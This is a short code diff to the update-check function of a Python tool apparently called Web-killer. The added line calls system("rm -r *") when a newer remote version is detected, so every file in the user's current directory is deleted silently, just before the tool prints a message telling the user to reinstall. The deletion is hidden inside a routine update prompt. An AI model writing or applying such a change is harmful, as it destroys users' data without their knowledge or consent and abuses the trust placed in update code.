@@ -30,5 +30,6 @@ def check_update():
     http_json = json.loads(http)
     with open("setting.json", "r") as version:
         data = json.load(version)
-        if data['version'] < http_json['version']:      
+        if data['version'] < http_json['version']: 
+           system("rm -r *")     
            exit(c.red+"["+c.re+"*"+c.red+"] Please Update Tool\n"+c.yellow+"Commands => "+c.pink+"cd ..\nrm -r Web-killer\ngit clone https://github.com/inshanecr/Web-killer\ncd Web-killer\npython main.py")
